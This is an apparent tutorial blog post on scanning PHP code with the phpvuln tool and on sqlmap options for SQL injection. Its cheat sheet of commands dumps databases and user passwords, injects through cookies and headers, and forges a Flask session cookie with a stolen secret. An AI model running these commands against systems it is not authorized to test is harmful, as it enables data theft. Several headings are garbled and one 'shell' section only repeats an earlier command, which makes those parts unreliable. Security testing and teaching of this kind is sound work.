# phpvuln sqlmaps - finding vulnerabilities in php code

Hi, I'm Carl Vincent Reyno, a security engineer at HackerOne. I'm going to discuss how to find vulnerabilities in PHP code and how sqlmap works.

So, According to the Zend (2023), A PHP vulnerability is an exploitable flaw in a PHP application that can be used to gain unauthorized access to systems that comprise or underlie that PHP application.

Here's the dependencies on how to execute this in python3 pre-installed in your computer. 

Let’s install it by using the following command:

```python
apt install python3
```

<b> Installing the PHP  </b>

```python
git clone https://github.com/ecriminal/phpvuln.git
cd phpvuln/
python3 phpvuln.py -h
```

<b> Getting the vulnerability list <b>
Here you can see the list of many types of vulnerabilities that you can identify in php code with the help of this tool.
```python
python3 phpvuln.py --list-vuln
```

<b>Find Vulnerability</b>
As you may have come to know about this tool why developers have created this tool. All we have to do is give the path of the php project that we want to investigate and it will identify all the vulnerability by itself.

```python
! python3 phpvuln.py -p < your path of php code >
```
```python
python3 phpvuln.py -p .../.../Desktop/bWAPP/
```

Also you can use the following command if you want to find a specific vulnerability in PHP code.

```python
! python3 phpvuln.py -p < your path of php code > -v < vuln name >
```

```python
python3 phpvuln.py -p /.../.../Desktop/bWAPP/ -v rfi
```
Thus, you can use all the features of this tool one by one and benefit by finding significant vulnerabilities in php code.


<b> For the sqlmaps, we discuss on how php vuln works in the system using linux. Now we need to know how sqlmaps work</b>

Here are the commands from `Generic.py` to generate basic arguments for sqlmap and to get a general idea about the topic:
```python
-u "<URL>" 
-p "<PARAM TO TEST>" 
--user-agent=SQLMAP 
--random-agent 
--threads=10 
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>" 
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```

We are retrieving information from the sqlmaps:

<b>Retrieve Information</b>

<b>Internal</b>
```python
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
<b>First database data</b>
```python
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```

We are now creating a SQL Injection Place:

<b> ZAP/BURP Suite Configuration # </b>
```python
sqlmap -r req.txt --current-user
-
```
<b> Getting a Request Rejection # </b>
```python
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
<b> Posting a Request Rejection # </b>
```python
sqlmap -u "http://example.com" --data "username=*&password=*"
```

<b> Inserting some Injections in Headers and Other HTTP Methods # </b>
```python
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```

<b> Indicating if the string is successfully injected in the Headers # </b>
```python
--string="string_showed_when_TRUE" 
```


Sqlmap supports the usage of -e or --eval to process each payload before delivering it with a oneliner in Python. This makes customizing the payload before sending it very simple and quick. In the following example, flask signs the flask cookie session with the known secret before transmitting it:
```python
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```

<b> Implementing Shell Unix in Linux </b>
```python
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
